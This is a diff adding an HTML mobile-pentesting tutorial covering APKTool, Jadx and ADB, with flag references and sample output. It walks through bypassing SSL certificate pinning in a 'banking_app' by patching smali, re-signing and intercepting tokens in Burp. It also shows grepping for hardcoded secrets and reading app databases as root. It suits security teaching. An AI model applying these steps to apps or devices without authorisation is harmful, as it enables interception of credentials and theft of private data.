@@ -956,6 +956,2032 @@ my-app.apk/
 │   ├── layout/                 ← XML UI layouts
 │   └── values/                 ← Strings, colors, dimensions
 └── kotlin/                      ← Kotlin metadata (if app uses Kotlin)
+</div>
+
+            <div class="info-box">
+                <h4>Why This Structure Matters for Pentesting</h4>
+                <p>Every folder and file has security implications:</p>
+                <ul style="margin-top: 1rem; color: var(--text2);">
+                    <li><strong>AndroidManifest.xml:</strong> Lists all permissions (camera, location, contacts). Over-privileged apps = red flag!</li>
+                    <li><strong>classes.dex:</strong> The actual code. This is what you decompile to find vulnerabilities.</li>
+                    <li><strong>lib/:</strong> Native libraries can contain hardcoded secrets or backdoors.</li>
+                    <li><strong>assets/:</strong> Often contains databases, config files, API keys in plaintext.</li>
+                    <li><strong>res/values/strings.xml:</strong> Developers sometimes hide API keys here thinking "it's just a string file."</li>
+                </ul>
+            </div>
+
+            <h3>Part 1: APKTool - The Swiss Army Knife of APK Analysis</h3>
+
+            <p><strong>APKTool</strong> is THE tool for decompiling and recompiling Android APK files. It converts the binary APK into human-readable format (Smali code and XML files), lets you modify it, then repackages it back into an APK. This is essential for understanding how apps work and testing modifications.</p>
+
+            <div class="metaphor-box">
+                <h4>💡 APKTool is Like Google Translate for Apps</h4>
+                <p>Imagine you receive a book written in an alien language (the compiled APK). You can't read it directly. APKTool is your translator—it converts the alien language into something you can understand (Smali code, XML files). You can then edit the translation, and APKTool will convert it back into the alien language so the app can run with your changes!</p>
+            </div>
+
+            <h4>Installing APKTool</h4>
+
+            <div class="code"># APKTool comes pre-installed on Kali, but here's how to update it:
+wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
+wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar
+mv apktool_2.9.3.jar apktool.jar
+chmod +x apktool apktool.jar
+sudo mv apktool apktool.jar /usr/local/bin/
+
+# Verify installation:
+apktool --version
+
+# Output:
+# 2.9.3</div>
+
+            <h4>Decompiling an APK with APKTool</h4>
+
+            <div class="code"># Basic syntax:
+# apktool d [flags] <apk_file> [output_directory]
+#
+# d = decode (decompile)
+
+# Example: Decompile an APK
+apktool d myapp.apk
+
+# Output:
+# I: Using Apktool 2.9.3
+# I: Loading resource table...
+# I: Decoding AndroidManifest.xml with resources...
+# I: Loading resource table from file: /home/user/.local/share/apktool/framework/1.apk
+# I: Regular manifest package...
+# I: Decoding file-resources...
+# I: Decoding values */* XMLs...
+# I: Baksmaling classes.dex...
+# I: Baksmaling classes2.dex...
+# I: Copying assets and libs...
+# I: Copying unknown files...
+# I: Copying original files...
+#
+# Creates folder: myapp/
+
+# Navigate into decompiled app:
+cd myapp/
+ls -la
+
+# Output:
+# AndroidManifest.xml    ← Now human-readable XML!
+# apktool.yml            ← APKTool metadata
+# original/              ← Original META-INF (signature)
+# res/                   ← All resources (images, layouts, strings)
+# smali/                 ← Decompiled code in Smali format
+# lib/                   ← Native libraries
+# assets/                ← Asset files</div>
+
+            <h4>APKTool Flags Explained (Every Single One!)</h4>
+
+            <div class="code"># -d, --decode
+# Decompile the APK (this is the default action)
+apktool d myapp.apk
+
+# -f, --force
+# Force delete destination directory if it exists already
+apktool d -f myapp.apk
+
+# Without -f, you'd get error: "Destination directory exists, use -f to force"
+# With -f, APKTool deletes the old folder and creates a fresh decompile
+
+# -o, --output <dir>
+# Specify custom output directory name
+apktool d myapp.apk -o my_custom_folder
+
+# Creates "my_custom_folder" instead of default "myapp"
+
+# -s, --no-src
+# Do NOT decompile source code (skip classes.dex → smali conversion)
+# Only extract resources (AndroidManifest, res/, assets/)
+apktool d -s myapp.apk
+
+# Useful when you only care about resources, not code
+# Much faster! (No need to decompile thousands of smali files)
+
+# -r, --no-res
+# Do NOT decode resources (skip res/ folder)
+# Only decompile code (classes.dex → smali)
+apktool d -r myapp.apk
+
+# Opposite of -s. Use when you only need code, not images/layouts
+
+# --no-assets
+# Do NOT decode assets
+# Skip the assets/ folder extraction
+apktool d --no-assets myapp.apk
+
+# --only-main-classes
+# Only decompile main classes.dex (skip classes2.dex, classes3.dex, etc.)
+apktool d --only-main-classes myapp.apk
+
+# Large apps split code into multiple DEX files
+# This flag saves time by only processing the first one
+
+# --frame-path <dir>
+# Specify custom framework directory
+# (Advanced: For apps that depend on specific Android framework versions)
+apktool d --frame-path /path/to/frameworks myapp.apk
+
+# -p, --frame-tag <tag>
+# Tag frameworks using a specific name
+apktool d -p samsung_framework myapp.apk
+
+# Useful for Samsung/Xiaomi/etc. apps with custom frameworks
+
+# -t, --tag <tag>
+# Use specific framework files with this tag
+apktool d -t samsung myapp.apk
+
+# --api <level>
+# Set Android API level manually
+apktool d --api 30 myapp.apk
+
+# Forces APKTool to treat the app as Android 11 (API 30)
+
+# -m, --match-original
+# Keep some files in their original form (don't decode them)
+apktool d -m myapp.apk
+
+# Useful for preserving signature-related files</div>
+
+            <h4>Recompiling (Building) an APK</h4>
+
+            <div class="code"># After modifying the decompiled app, rebuild it:
+# apktool b [flags] <folder_name>
+#
+# b = build (recompile)
+
+# Basic build:
+apktool b myapp
+
+# Output:
+# I: Using Apktool 2.9.3
+# I: Checking whether sources has changed...
+# I: Smaling smali folder into classes.dex...
+# I: Smaling smali_classes2 folder into classes2.dex...
+# I: Building resources...
+# I: Copying libs... (/lib)
+# I: Copying libs... (/kotlin)
+# I: Building apk file...
+# I: Copying unknown files/dir...
+# I: Built apk into: myapp/dist/myapp.apk
+#
+# The rebuilt APK is in: myapp/dist/myapp.apk
+
+# Build flags:
+
+# -f, --force
+# Force rebuild even if no changes detected
+apktool b -f myapp
+
+# -o, --output <file>
+# Specify output APK filename
+apktool b myapp -o modified_app.apk
+
+# -c, --copy-original
+# Copy original files (like original signature)
+apktool b -c myapp
+
+# -p, --frame-path <dir>
+# Use custom framework path (must match what you used during decode)
+apktool b -p samsung_framework myapp
+
+# -d, --debug
+# Build in debug mode (easier to debug with Android Studio)
+apktool b -d myapp
+
+# -n, --net-sec-conf
+# Do not include default network security config
+apktool b -n myapp
+
+# Useful if you're adding custom network config
+
+# -a, --aapt <path>
+# Use custom aapt binary (Android Asset Packaging Tool)
+apktool b -a /path/to/custom/aapt myapp
+
+# --use-aapt2
+# Use aapt2 instead of aapt (newer, faster)
+apktool b --use-aapt2 myapp</div>
+
+            <div class="warning-box">
+                <h4>⚠️ Rebuilt APKs Need to Be Signed!</h4>
+                <p>After rebuilding an APK, Android will REFUSE to install it because it's no longer signed by the original developer. You must sign it with your own key:<br><br>
+                <strong>Step 1: Generate a keystore (one-time setup)</strong></p>
+                <div class="code" style="margin-top: 1rem;">keytool -genkey -v -keystore my-release-key.keystore -alias my_alias -keyalg RSA -keysize 2048 -validity 10000
+
+# Answer the prompts:
+# Enter keystore password: [your_password]
+# Re-enter password: [your_password]
+# What is your first and last name? [Your Name]
+# [... more questions ...]
+
+# This creates: my-release-key.keystore</div>
+                <p style="margin-top: 1rem;"><strong>Step 2: Sign the rebuilt APK</strong></p>
+                <div class="code" style="margin-top: 1rem;">jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore my-release-key.keystore myapp/dist/myapp.apk my_alias
+
+# Enter Passphrase for keystore: [your_password]
+# Output:
+#   signing: AndroidManifest.xml
+#   signing: classes.dex
+#   signing: resources.arsc
+#   [... more files ...]
+# jar signed.</div>
+                <p style="margin-top: 1rem;"><strong>Step 3: Verify signature</strong></p>
+                <div class="code" style="margin-top: 1rem;">jarsigner -verify -verbose -certs myapp/dist/myapp.apk
+
+# Output:
+# jar verified.</div>
+                <p style="margin-top: 1rem;">Now your APK can be installed on Android devices!</p>
+            </div>
+
+            <h4>Real-World APKTool Workflow: Bypassing Certificate Pinning</h4>
+
+            <p>Let's see APKTool in action with a common pentest scenario: bypassing SSL certificate pinning to intercept HTTPS traffic.</p>
+
+            <div class="code"># Step 1: Decompile the target app
+apktool d banking_app.apk
+
+# Step 2: Navigate to decompiled code
+cd banking_app/smali/com/bankingapp/network/
+
+# Step 3: Find the certificate pinning code
+# Look for files with "SSL", "Certificate", "Pinning" in names
+grep -r "SSL" .
+grep -r "Certificate" .
+
+# Step 4: Open the relevant smali file
+nano SSLPinningManager.smali
+
+# You'll see Smali code (looks like assembly language):
+# 
+# .method public checkServerTrusted([Ljava/security/cert/X509Certificate;Ljava/lang/String;)V
+#     .locals 2
+#     const/4 v0, 0x0
+#     invoke-static {}, Lcom/bankingapp/security/CertValidator;->verify()Z
+#     move-result v0
+#     if-nez v0, :cond_0
+#     new-instance v1, Ljava/security/cert/CertificateException;
+#     const-string v0, "Certificate validation failed"
+#     invoke-direct {v1, v0}, Ljava/security/cert/CertificateException;-><init>(Ljava/lang/String;)V
+#     throw v1
+#     :cond_0
+#     return-void
+# .end method
+
+# Step 5: Modify the code to always return (bypass check)
+# Change:
+#     invoke-static {}, Lcom/bankingapp/security/CertValidator;->verify()Z
+#     move-result v0
+#     if-nez v0, :cond_0
+#     [throw exception code]
+# 
+# To:
+#     return-void
+
+# This makes the function immediately return without checking certificates!
+
+# Step 6: Save and rebuild
+apktool b banking_app
+
+# Step 7: Sign the modified APK
+jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore ~/my-key.keystore banking_app/dist/banking_app.apk my_alias
+
+# Step 8: Install on device
+adb install banking_app/dist/banking_app.apk
+
+# Step 9: Set up Burp Suite proxy on your device
+# Now all HTTPS traffic from the app goes through Burp, and certificate errors are ignored!
+
+# Step 10: Intercept API calls
+# Open the banking app and watch Burp Suite capture all requests
+# You can now see authentication tokens, API endpoints, sensitive data!</div>
+
+            <div class="metaphor-box">
+                <h4>💡 What Did We Just Do?</h4>
+                <p>Think of SSL pinning like a bouncer checking IDs at a club. The app only trusts specific certificates (IDs), and rejects all others—even your Burp Suite proxy certificate.<br><br>
+                By modifying the Smali code, we told the bouncer "just let everyone in without checking IDs." Now we can intercept all the HTTPS traffic between the app and the server!<br><br>
+                This is a CRITICAL technique for mobile pentesting because modern apps use SSL to hide their API calls. Without bypassing SSL pinning, you can't see what data the app is sending!</p>
+            </div>
+
+            <h4>Finding Hardcoded Secrets with APKTool</h4>
+
+            <div class="code"># After decompiling with APKTool:
+cd myapp/
+
+# Search for API keys:
+grep -r "api" . | grep -i "key"
+grep -r "apikey" .
+grep -r "api_key" .
+
+# Output examples:
+# ./res/values/strings.xml:<string name="google_api_key">AIzaSyB1234567890_API_KEY_HERE</string>
+# ./smali/com/example/api/Config.smali:    const-string v0, "sk_live_51234567890"
+
+# Search for passwords:
+grep -r "password" . | grep -v ".png" | grep -v ".jpg"
+# (excluding image files)
+
+# Output:
+# ./res/values/strings.xml:<string name="default_password">admin123</string>
+# ./smali/com/example/auth/Login.smali:    const-string v1, "hardcoded_password"
+
+# Search for database credentials:
+grep -r "jdbc" .
+grep -r "mysql" .
+grep -r "postgres" .
+
+# Search for AWS/cloud keys:
+grep -r "AKIA" .     # AWS Access Key format
+grep -r "aws" .
+
+# Search for tokens:
+grep -r "token" . | grep -v ".png"
+grep -r "bearer" .
+grep -r "jwt" .
+
+# Check AndroidManifest.xml for suspicious permissions:
+cat AndroidManifest.xml | grep "permission"
+
+# Output:
+# <uses-permission android:name="android.permission.INTERNET"/>
+# <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+# <uses-permission android:name="android.permission.READ_CONTACTS"/>  ← Why does this app need contacts?
+# <uses-permission android:name="android.permission.CAMERA"/>
+# <uses-permission android:name="android.permission.RECORD_AUDIO"/>  ← Spyware?</div>
+
+            <div class="info-box">
+                <h4>Smali vs Java: What's the Difference?</h4>
+                <p><strong>Java:</strong> High-level language developers write in<br>
+                <strong>DEX:</strong> Compiled format Android uses (Dalvik Executable)<br>
+                <strong>Smali:</strong> Human-readable representation of DEX bytecode<br><br>
+                Think of it like this:<br>
+                • <strong>Java:</strong> "if (password == 'admin') { login(); }"<br>
+                • <strong>Smali:</strong> "const-string v0, 'admin' / if-eq v0, v1, :cond_0 / invoke-virtual {p0}, login"<br><br>
+                Smali is harder to read but still understandable with practice. APKTool outputs Smali because you can't directly get Java from DEX. For Java-like code, use <strong>Jadx</strong> (next tool!)</p>
+            </div>
+
+            <h3>Part 2: Jadx - Java Decompiler for Android</h3>
+
+            <p><strong>Jadx</strong> takes APK files and decompiles them directly into Java code—much easier to read than Smali! It has both GUI and command-line modes.</p>
+
+            <div class="code"># Install Jadx (comes with Kali, but here's manual install):
+wget https://github.com/skylot/jadx/releases/download/v1.4.7/jadx-1.4.7.zip
+unzip jadx-1.4.7.zip -d jadx
+cd jadx/bin
+./jadx-gui   # Launch GUI version
+
+# Or use command-line:
+./jadx myapp.apk</div>
+
+            <h4>Jadx GUI - The Easy Way</h4>
+
+            <div class="code"># Launch Jadx GUI:
+jadx-gui
+
+# In the GUI:
+# 1. File → Open File → Select myapp.apk
+# 2. Wait for decompilation (can take 1-5 minutes for large apps)
+# 3. Browse the code in the left panel
+# 4. Click any class to see Java code!
+
+# Features:
+# ✅ Full-text search (Ctrl+Shift+F)
+# ✅ Find usages of any method/class
+# ✅ Jump to declaration (Ctrl+B)
+# ✅ Export to Gradle project
+# ✅ Deobfuscation (unscramble obfuscated code)</div>
+
+            <div class="metaphor-box">
+                <h4>💡 APKTool vs Jadx: When to Use What?</h4>
+                <p><strong>Use APKTool when:</strong><br>
+                • You need to MODIFY and RECOMPILE the app<br>
+                • You want to see the exact Smali code (closer to actual bytecode)<br>
+                • You need to edit resources (strings.xml, layouts)<br><br>
+                <strong>Use Jadx when:</strong><br>
+                • You just want to READ the code (not modify)<br>
+                • You prefer Java over Smali (much more readable!)<br>
+                • You're searching for specific vulnerabilities in logic<br><br>
+                <strong>Pro tip:</strong> Use BOTH! Decompile with Jadx to understand the code, then use APKTool to make modifications!</p>
+            </div>
+
+            <h4>Jadx Command-Line Flags (Complete Reference)</h4>
+
+            <div class="code"># Basic decompile:
+jadx myapp.apk
+
+# Creates folder: myapp/
+# Inside: sources/ (Java code) and resources/ (XML, images, etc.)
+
+# -d, --output-dir <dir>
+# Specify output directory
+jadx -d output_folder myapp.apk
+
+# -j, --threads-count <number>
+# Number of threads for decompilation (faster!)
+jadx -j 8 myapp.apk
+
+# Uses 8 CPU cores (default is 4)
+# Large apps benefit hugely from this!
+
+# --no-res
+# Do NOT decompile resources (skip resources folder)
+jadx --no-res myapp.apk
+
+# Faster if you only care about code
+
+# --no-src
+# Do NOT decompile source code (only extract resources)
+jadx --no-src myapp.apk
+
+# Opposite of --no-res
+
+# --show-bad-code
+# Include code that failed to decompile (usually obfuscated junk)
+jadx --show-bad-code myapp.apk
+
+# Normally Jadx skips methods it can't decompile
+# This flag shows them anyway (as comments)
+
+# --no-imports
+# Don't add import statements (shows full class names everywhere)
+jadx --no-imports myapp.apk
+
+# Makes code longer but more explicit
+
+# --no-debug-info
+# Strip debug information
+jadx --no-debug-info myapp.apk
+
+# --add-debug-lines
+# Add comments with original line numbers
+jadx --add-debug-lines myapp.apk
+
+# --no-inline-anonymous
+# Don't inline anonymous classes
+jadx --no-inline-anonymous myapp.apk
+
+# --no-replace-consts
+# Don't replace constants with actual values
+jadx --no-replace-consts myapp.apk
+
+# Example: Shows "0x7F0A0001" instead of "R.id.button"
+
+# --escape-unicode
+# Escape non-ASCII characters in strings
+jadx --escape-unicode myapp.apk
+
+# --deobf
+# Enable deobfuscation (unscramble obfuscated names)
+jadx --deobf myapp.apk
+
+# Changes:
+#   class a { void b() { ... } }
+# To:
+#   class MainActivity { void onCreate() { ... } }
+
+# --deobf-min <length>
+# Minimum length for deobfuscated names (default: 3)
+jadx --deobf --deobf-min 4 myapp.apk
+
+# --deobf-max <length>
+# Maximum length for deobfuscated names (default: 64)
+jadx --deobf --deobf-max 20 myapp.apk
+
+# --deobf-cfg-file <file>
+# Custom deobfuscation map
+jadx --deobf --deobf-cfg-file mapping.txt myapp.apk
+
+# --deobf-use-sourcename
+# Use source file names for class naming
+jadx --deobf --deobf-use-sourcename myapp.apk
+
+# --deobf-parse-kotlin-metadata
+# Use Kotlin metadata for deobfuscation
+jadx --deobf --deobf-parse-kotlin-metadata myapp.apk
+
+# --export-gradle
+# Export as Android Studio project with gradle
+jadx --export-gradle myapp.apk
+
+# Creates buildable Android Studio project!
+
+# -v, --verbose
+# Verbose output (show progress details)
+jadx -v myapp.apk
+
+# --version
+# Show Jadx version
+jadx --version</div>
+
+            <h4>Finding Security Issues with Jadx</h4>
+
+            <div class="code"># After decompiling with Jadx:
+cd myapp/sources/com/example/app/
+
+# 1. Find hardcoded credentials:
+grep -r "password" . | grep -v ".png"
+
+# Output:
+# ./auth/LoginActivity.java:    private static final String PASSWORD = "admin123";
+
+# Open the file:
+cat auth/LoginActivity.java
+
+# You see:
+# public class LoginActivity {
+#     private static final String DEFAULT_USER = "admin";
+#     private static final String DEFAULT_PASSWORD = "admin123";
+#     
+#     private void doLogin(String username, String password) {
+#         if (username.equals(DEFAULT_USER) && password.equals(DEFAULT_PASSWORD)) {
+#             // Hardcoded backdoor!
+#         }
+#     }
+# }
+
+# 2. Find SQL injection vulnerabilities:
+grep -r "execSQL" .
+grep -r "rawQuery" .
+grep -r "query(" .
+
+# Look for string concatenation instead of prepared statements:
+# ❌ BAD (vulnerable):
+# String query = "SELECT * FROM users WHERE username='" + username + "'";
+# db.rawQuery(query, null);
+# 
+# ✅ GOOD (safe):
+# String query = "SELECT * FROM users WHERE username=?";
+# db.rawQuery(query, new String[]{username});
+
+# 3. Find insecure file storage:
+grep -r "openFileOutput" .
+grep -r "getExternalStorageDirectory" .
+grep -r "MODE_WORLD_READABLE" .
+
+# MODE_WORLD_READABLE = any app can read this file! (deprecated but still found)
+
+# 4. Find insecure crypto:
+grep -r "DES" .     # Weak encryption
+grep -r "MD5" .     # Weak hashing
+grep -r "SHA1" .    # Weak hashing
+
+# Look for:
+# Cipher cipher = Cipher.getInstance("DES");  ← BAD! Use AES!
+# MessageDigest md = MessageDigest.getInstance("MD5");  ← BAD! Use SHA-256!
+
+# 5. Find API endpoints:
+grep -r "http://" .
+grep -r "https://" .
+grep -r "api" . | grep -i "url"
+
+# Output:
+# ./network/ApiClient.java:    private static final String BASE_URL = "https://api.example.com";
+# ./network/ApiClient.java:    private static final String AUTH_ENDPOINT = "/auth/login";
+
+# Now you know the API structure!
+
+# 6. Find debugging code that shouldn't be in production:
+grep -r "Log.d" .
+grep -r "Log.v" .
+grep -r "System.out.println" .
+
+# Example:
+# ./auth/LoginActivity.java:    Log.d("AUTH", "Password: " + password);
+# ↑ Logs user passwords! Major security issue!
+
+# 7. Find WebView vulnerabilities:
+grep -r "WebView" .
+grep -r "setJavaScriptEnabled" .
+grep -r "addJavascriptInterface" .
+
+# Look for:
+# webView.setJavaScriptEnabled(true);  ← Needed for web apps
+# webView.addJavascriptInterface(new JsInterface(), "Android");
+# ↑ Allows JavaScript to call Java methods! Can be exploited!
+
+# 8. Find intent vulnerabilities (exported components):
+cd ../../    # Back to root
+grep -r "exported=\"true\"" .
+
+# Shows which components are accessible by other apps
+# Could be exploited for privilege escalation!</div>
+
+            <div class="info-box">
+                <h4>Common Vulnerabilities Found via Jadx</h4>
+                <p><strong>Hardcoded Secrets:</strong> API keys, passwords, tokens directly in code<br>
+                <strong>Insecure Crypto:</strong> DES, MD5, SHA1, hardcoded encryption keys<br>
+                <strong>SQL Injection:</strong> String concatenation in database queries<br>
+                <strong>Path Traversal:</strong> User input directly in file paths<br>
+                <strong>Insecure Data Storage:</strong> Sensitive data in SharedPreferences, external storage<br>
+                <strong>Weak Authentication:</strong> Client-side validation, hardcoded credentials<br>
+                <strong>Information Disclosure:</strong> Logging sensitive data, debug code in production<br>
+                <strong>WebView Exploits:</strong> JavaScript interfaces, allowFileAccess enabled<br><br>
+                <strong>Pro tip:</strong> Always check ProGuard/R8 obfuscation. If code looks scrambled (class names like 'a', 'b', 'c'), use --deobf flag!</p>
+            </div>
+
+            <h3>Part 3: ADB - Android Debug Bridge Master Class</h3>
+
+            <p><strong>ADB (Android Debug Bridge)</strong> is your command-line interface to Android devices. It lets you install apps, access the shell, pull/push files, view logs, and much more. Essential for dynamic analysis!</p>
+
+            <div class="code"># Check if ADB is installed:
+adb version
+
+# Output:
+# Android Debug Bridge version 1.0.41
+# Version 34.0.5-10900879
+
+# Start ADB server (run once after boot):
+adb start-server
+
+# Output:
+# * daemon not running; starting now at tcp:5037
+# * daemon started successfully
+
+# List connected devices:
+adb devices
+
+# Output:
+# List of devices attached
+# emulator-5554    device
+# R58M12345678     device
+# 
+# Shows emulators and physical devices
+# "device" means ready for commands
+# If you see "unauthorized", accept the popup on your phone!</div>
+
+            <h4>ADB Essential Commands (Complete Reference)</h4>
+
+            <div class="code"># ==================== DEVICE MANAGEMENT ====================
+
+# adb devices
+# List all connected devices
+adb devices
+
+# adb devices -l
+# List devices with details (model, product, transport)
+adb devices -l
+
+# Output:
+# emulator-5554          device product:sdk_gphone64_arm64 model:sdk_gphone64_arm64 device:emu64a transport_id:1
+
+# adb connect <ip>:<port>
+# Connect to device over network (WiFi ADB)
+adb connect 192.168.1.100:5555
+
+# adb disconnect
+# Disconnect all network devices
+adb disconnect
+
+# adb -s <device_id> <command>
+# Run command on specific device (when multiple devices connected)
+adb -s emulator-5554 shell
+
+# adb kill-server
+# Stop ADB server
+adb kill-server
+
+# adb start-server
+# Start ADB server
+adb start-server
+
+# ==================== APP INSTALLATION ====================
+
+# adb install <apk>
+# Install APK to device
+adb install myapp.apk
+
+# Output:
+# Performing Streamed Install
+# Success
+
+# adb install -r <apk>
+# Reinstall existing app (keeps data)
+adb install -r myapp.apk
+
+# adb install -g <apk>
+# Install and grant all permissions
+adb install -g myapp.apk
+
+# adb install -d <apk>
+# Allow version downgrade
+adb install -d myapp_v1.0.apk
+
+# adb install -t <apk>
+# Allow test APKs
+adb install -t debug.apk
+
+# adb uninstall <package_name>
+# Uninstall app
+adb uninstall com.example.myapp
+
+# adb uninstall -k <package_name>
+# Uninstall but keep data
+adb uninstall -k com.example.myapp
+
+# ==================== FILE TRANSFER ====================
+
+# adb push <local> <remote>
+# Copy file from computer to device
+adb push payload.txt /sdcard/Download/
+
+# adb push directory/ <remote>
+# Copy entire directory
+adb push tools/ /sdcard/tools/
+
+# adb pull <remote> <local>
+# Copy file from device to computer
+adb pull /sdcard/DCIM/Camera/photo.jpg ./
+
+# adb pull /data/data/com.example.app/databases/ ./databases/
+# Pull app's databases (requires root!)
+
+# ==================== SHELL ACCESS ====================
+
+# adb shell
+# Open interactive shell on device
+adb shell
+
+# Now you're inside Android! You can run Linux commands:
+# ls /sdcard/
+# cd /data/app/
+# ps -A    (list all processes)
+# exit     (leave shell)
+
+# adb shell <command>
+# Run single command without interactive shell
+adb shell ls -la /sdcard/
+
+# adb shell 'command1; command2'
+# Run multiple commands
+adb shell 'cd /sdcard/ && ls'
+
+# adb root
+# Restart ADB daemon with root permissions (rooted devices only)
+adb root
+
+# Output:
+# restarting adbd as root
+
+# adb unroot
+# Restart ADB daemon without root
+adb unroot
+
+# ==================== PACKAGE MANAGER (pm) ====================
+
+# adb shell pm list packages
+# List ALL installed packages
+adb shell pm list packages
+
+# Output (partial):
+# package:com.android.camera
+# package:com.example.myapp
+# package:com.whatsapp
+# [hundreds more...]
+
+# adb shell pm list packages -f
+# List packages with APK file paths
+adb shell pm list packages -f
+
+# Output:
+# package:/data/app/com.example.myapp-xyz=/com.example.myapp
+
+# adb shell pm list packages -3
+# List only third-party apps (not system apps)
+adb shell pm list packages -3
+
+# adb shell pm list packages <keyword>
+# Filter packages by keyword
+adb shell pm list packages | grep bank
+
+# Output:
+# package:com.bankofamerica.mobile
+# package:com.chase.banking
+
+# adb shell pm path <package>
+# Show APK path for package
+adb shell pm path com.example.myapp
+
+# Output:
+# package:/data/app/com.example.myapp-ABC123/base.apk
+
+# adb shell pm dump <package>
+# Show EVERYTHING about a package
+adb shell pm dump com.example.myapp
+
+# Output:
+# Package [com.example.myapp] (12a34b56):
+#   userId=10123
+#   pkg=Package{...}
+#   codePath=/data/app/com.example.myapp-ABC123
+#   resourcePath=/data/app/com.example.myapp-ABC123
+#   legacyNativeLibraryDir=/data/app/com.example.myapp-ABC123/lib
+#   primaryCpuAbi=arm64-v8a
+#   versionCode=100 minSdk=21 targetSdk=33
+#   versionName=1.0.0
+#   [... TONS more info ...]
+
+# adb shell pm grant <package> <permission>
+# Grant permission to app
+adb shell pm grant com.example.myapp android.permission.CAMERA
+
+# adb shell pm revoke <package> <permission>
+# Revoke permission from app
+adb shell pm revoke com.example.myapp android.permission.CAMERA
+
+# adb shell pm clear <package>
+# Clear app data (like "Clear Cache" in settings)
+adb shell pm clear com.example.myapp
+
+# Output:
+# Success
+
+# ==================== ACTIVITY MANAGER (am) ====================
+
+# adb shell am start <intent>
+# Launch an app/activity
+adb shell am start -n com.example.myapp/.MainActivity
+
+# -n = component name (package/activity)
+# Output:
+# Starting: Intent { cmp=com.example.myapp/.MainActivity }
+
+# adb shell am start -a <action>
+# Start activity with action
+adb shell am start -a android.intent.action.VIEW -d https://example.com
+
+# Opens URL in default browser
+
+# adb shell am startservice <intent>
+# Start a service
+adb shell am startservice -n com.example.myapp/.MyService
+
+# adb shell am broadcast <intent>
+# Send broadcast
+adb shell am broadcast -a android.intent.action.BOOT_COMPLETED
+
+# Simulates device boot
+
+# adb shell am force-stop <package>
+# Force-stop an app
+adb shell am force-stop com.example.myapp
+
+# adb shell am kill <package>
+# Kill app (less aggressive than force-stop)
+adb shell am kill com.example.myapp
+
+# ==================== LOGS ====================
+
+# adb logcat
+# View system logs in real-time
+adb logcat
+
+# Output (scrolls continuously):
+# 01-07 14:30:45.123  1234  5678 I ActivityManager: Start proc 9999:com.example.myapp
+# 01-07 14:30:45.456  9999  9999 D MyApp: User logged in: user@example.com
+# 01-07 14:30:45.789  9999  9999 E MyApp: Error: java.lang.NullPointerException
+# [... continuous stream ...]
+
+# adb logcat -c
+# Clear the log buffer
+adb logcat -c
+
+# adb logcat <tag>:V
+# Filter by tag (V=Verbose, show everything for this tag)
+adb logcat MyApp:V *:S
+
+# *:S = silence all other tags
+# Shows only logs from "MyApp" tag
+
+# adb logcat *:E
+# Show only ERROR level logs
+adb logcat *:E
+
+# adb logcat | grep "password"
+# Search logs for keyword
+adb logcat | grep -i "password"
+
+# Dangerous if app logs passwords!
+
+# adb logcat -v time
+# Add timestamps to logs
+adb logcat -v time
+
+# adb logcat -d
+# Dump logs and exit (don't follow)
+adb logcat -d > logs.txt
+
+# Saves logs to file
+
+# ==================== SYSTEM INFORMATION ====================
+
+# adb shell dumpsys
+# Dump system services info (HUGE output!)
+adb shell dumpsys
+
+# adb shell dumpsys battery
+# Show battery info
+adb shell dumpsys battery
+
+# Output:
+# Current Battery Service state:
+#   AC powered: false
+#   USB powered: true
+#   level: 85
+#   temperature: 280
+#   voltage: 4235
+
+# adb shell dumpsys package <package>
+# Show package details (like pm dump but different format)
+adb shell dumpsys package com.example.myapp
+
+# adb shell dumpsys activity
+# Show activity stack (what apps are running)
+adb shell dumpsys activity
+
+# adb shell dumpsys meminfo <package>
+# Show memory usage
+adb shell dumpsys meminfo com.example.myapp
+
+# Output:
+# Applications Memory Usage (in Kilobytes):
+# Uptime: 123456 Realtime: 123456
+# 
+# ** MEMINFO in pid 12345 [com.example.myapp] **
+#                    Pss  Private  Shared
+#           Native Heap    10000     9000    1000
+#           Dalvik Heap    20000    19000    1000
+#                  [...]
+#                  TOTAL    50000    45000    5000
+
+# adb shell dumpsys window
+# Show window manager state
+adb shell dumpsys window
+
+# adb shell dumpsys connectivity
+# Show network connectivity info
+adb shell dumpsys connectivity
+
+# ==================== SCREENSHOTS & RECORDINGS ====================
+
+# adb shell screencap /sdcard/screen.png
+# Take screenshot
+adb shell screencap /sdcard/screen.png
+adb pull /sdcard/screen.png ./
+
+# adb shell screenrecord /sdcard/demo.mp4
+# Record screen video
+adb shell screenrecord /sdcard/demo.mp4
+
+# Press Ctrl+C to stop recording
+# Then:
+adb pull /sdcard/demo.mp4 ./
+
+# adb shell screenrecord --time-limit <seconds>
+# Record for specific duration
+adb shell screenrecord --time-limit 30 /sdcard/demo.mp4
+
+# Records for 30 seconds then stops
+
+# ==================== NETWORKING ====================
+
+# adb shell netstat
+# Show network connections
+adb shell netstat
+
+# adb shell ip addr
+# Show IP addresses
+adb shell ip addr
+
+# adb shell ping <host>
+# Ping a host
+adb shell ping google.com
+
+# adb shell tcpdump -w /sdcard/capture.pcap
+# Capture network traffic (requires tcpdump on device)
+adb shell tcpdump -w /sdcard/capture.pcap
+# Then:
+adb pull /sdcard/capture.pcap ./
+
+# ==================== ADVANCED / PENTESTING ====================
+
+# adb shell run-as <package>
+# Run commands as the app's user (access app's private data)
+adb shell
+# Inside shell:
+run-as com.example.myapp
+cd /data/data/com.example.myapp/databases/
+ls -la
+
+# Output:
+# -rw------- 1 u0_a123 u0_a123 12345 2026-01-07 14:30 userdata.db
+
+# Now you can read the app's database!
+
+# adb backup <package>
+# Backup app data
+adb backup -f backup.ab com.example.myapp
+
+# Creates backup.ab file
+# To extract:
+# dd if=backup.ab bs=1 skip=24 | openssl zlib -d | tar -xvf -
+
+# adb restore <backup_file>
+# Restore app data
+adb restore backup.ab
+
+# adb shell cat /proc/net/tcp
+# Show TCP connections (hexadecimal format)
+adb shell cat /proc/net/tcp
+
+# adb shell su
+# Switch to root user (rooted devices only)
+adb shell
+su
+# Now you have root shell (#)
+# Can access /data/data/ directories of all apps!
+
+# adb forward tcp:<local_port> tcp:<remote_port>
+# Port forwarding (access device services from computer)
+adb forward tcp:8080 tcp:8080
+
+# Now accessing localhost:8080 on your computer connects to device's port 8080!</div>
+
+            <div class="metaphor-box">
